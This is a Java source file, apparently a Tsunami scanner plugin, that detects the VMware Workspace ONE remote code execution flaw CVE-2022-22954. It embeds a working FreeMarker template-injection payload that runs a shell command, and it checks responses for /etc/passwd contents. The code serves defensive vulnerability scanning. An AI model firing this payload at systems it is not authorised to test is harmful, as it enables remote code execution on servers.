/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202222954;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonObject;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.*;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.time.Clock;
import java.time.Instant;
import java.util.NoSuchElementException;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2022-22954 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Cve202222954VulnDetector",
    version = "0.1",
    description =
        "VMware Workspace ONE Access and Identity Manager contain a remote code execution "
            + "vulnerability due to server-side template injection. A malicious actor with network "
            + "access can trigger a server-side template injection that may result in remote code "
            + "execution. ",
    author = "hh-hunter",
    bootstrapModule = Cve202222954DetectorBootstrapModule.class)
public final class Cve202222954VulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String CHECK_VUL_PATH =
      "catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7B%22freemarker%2Etemplate%2Eutility"
          + "%2EExecute%22%3Fnew%28%29%28%22cat%20%2F{{COMMAND}}%22%29%7D";
  static final String BRANDING_PATH = "SAAS/jersey/manager/api/branding";

  @VisibleForTesting static final Pattern DETECTION_PATTERN = Pattern.compile("root:[x*]:0:0");

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "An unauthenticated attacker with network access could exploit this vulnerability by sending "
          + "a specially crafted request to a vulnerable VMware Workspace ONE or Identity Manager. "
          + "Successful exploitation could result in remote code execution by exploiting a "
          + "server-side template injection flaw";

  private final HttpClient httpClient;
  private final Clock utcClock;
  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve202222954VulnDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2022-22954 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private String tryFindFqdn(NetworkService networkService) {
    String url = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + BRANDING_PATH;
    HttpResponse response;
    try {
      response = httpClient.send(get(url).withEmptyHeaders().build(), networkService);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request to %s", url);
      return null;
    }
    if (response.status().code() != 200 || response.bodyJson().isEmpty()) {
      return null;
    }

    try {
      JsonObject jsonBody = response.bodyJson().get().getAsJsonObject();
      // Iterate through children and check the "_links" array from each one of them
      for (var entry : jsonBody.entrySet()) {
        if (!entry.getValue().isJsonObject()) {
          continue;
        }
        var entryObj = entry.getValue().getAsJsonObject();

        // There should be a "_links" object here
        if (!entryObj.has("_links") || !entryObj.get("_links").isJsonObject()) {
          continue;
        }

        for (var linkEntry : entryObj.get("_links").getAsJsonObject().entrySet()) {
          // Get the link string value
          if (!linkEntry.getValue().isJsonPrimitive()
              || !linkEntry.getValue().getAsJsonPrimitive().isString()) {
            continue;
          }

          String link = linkEntry.getValue().getAsString();
          // Check that it's an absolute link
          if (!link.startsWith("http://") && !link.startsWith("https://")) {
            continue;
          }

          // Extract host from URL
          return new URL(link).getHost();
        }
      }
    } catch (NoSuchElementException
        | IllegalStateException
        | ClassCastException
        | MalformedURLException
        | NullPointerException e) {
      // We check each sub-key before trying to get it from the JSON Object, but let's catch just in
      // case
      return null;
    }

    return null;
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();
    Payload payload = this.payloadGenerator.generate(config);
    String fqdn = tryFindFqdn(networkService);
    if (fqdn == null) {
      logger.atWarning().log("Failed to find FQDN for %s", networkService);
      return false;
    }
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
                .replace(toUriAuthority(networkService.getNetworkEndpoint()), fqdn)
            + CHECK_VUL_PATH.replace("{{COMMAND}}", payload.getPayload());
    try {
      HttpResponse httpResponse =
          httpClient.send(
              get(targetUri).setHeaders(HttpHeaders.builder().build()).build(), networkService);
      if (httpResponse.status().code() == 400
          && DETECTION_PATTERN.matcher(httpResponse.bodyString().get()).find()) {
        return true;
      }

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return false;
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE-2022-22954"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2022-22954 VMware Workspace ONE Access - Freemarker SSTI")
                .setRecommendation(
                    "Apply the latest security patches provided by VMware to mitigate this vulnerability.")
                .setDescription(VULN_DESCRIPTION))
        .build();
  }
}
